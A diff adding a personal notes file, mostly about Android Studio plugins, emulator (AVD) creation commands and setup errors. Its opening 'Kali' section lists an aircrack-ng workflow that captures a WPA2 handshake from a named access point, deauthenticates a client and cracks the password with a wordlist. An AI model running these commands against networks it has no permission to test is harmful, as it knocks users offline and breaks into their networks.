@@ -1,0 +1,48 @@
+Kali
+	airodump-ng wlan0mon
+	airodump-ng -c 11 --bssid 24:09:95:FD:F0:2C -w /root/Desktop/ wlan0mon
+	aireplay-ng -0 2 -a 24:09:95:FD:F0:2C -c F0:27:65:69:12:93 wlan0mon
+	aircrack-ng -a2 -b 24:09:95:FD:F0:2C -w /root/wpa.txt /root/Desktop/*.cap
+
+Studio
+	+ Instalar plugins:
+		https://stackoverflow.com/questions/30617408/how-to-install-plugin-in-android-studio
+	
+	+ Limpiar logcat:
+		https://stackoverflow.com/questions/20192555/android-studio-how-to-create-hotkey-to-clear-logcat
+
+Emulador
+	+ 3.0.1:
+		https://developer.android.com/studio/run/managing-avds.html?hl=es-419
+		https://stackoverflow.com/questions/46948322/how-to-open-avd-manager-in-android-studio-3-0-version
+
+		+ Error:
+			Emulator: libGL error: unable to load driver: i965_dri.so
+
+			debian 9 stretch Emulator: libGL error: unable to load driver: i965_dri.so
+
+
+	+ Programas:
+		https://www.developer.com/ws/android/exploring-the-android-sdk-and-avd-managers.html
+		https://stackoverflow.com/questions/46606287/not-able-to-create-avd-using-command-line
+
+	+ SDK:
+		$ cd local/android_3859937
+		$ sdkmanager "system-images;android-25;google_apis;x86"
+		$ avdmanager create avd -n test -k "system-images;android-25;google_apis;x86"
+		$ avdmanager list avd
+		$ emulator -avd test
+
+		avdmanager create avd -n test -k "system-images;android-25;google_apis;x86" -b x86 -c 100M -d 7 -f
+
+		+ Crear:
+		$ echo no | avdmanager create avd --force --name testAVD --abi google_apis/x86_64 --package 'system-images;android-23;google_apis;x86_64'
+		$ avdmanager create avd --force --name testAVD --abi google_apis/x86 --package 'system-images;android-23;google_apis;x86'
+
+	+ Errores:
+		linux sdk package path is not valid
+
+		https://stackoverflow.com/questions/10969753/android-command-not-found
+		https://stackoverflow.com/questions/43275238/how-to-set-system-images-path-when-creating-an-android-avd
+		https://stackoverflow.com/questions/36198165/failed-to-find-android-home-environment-variable
+
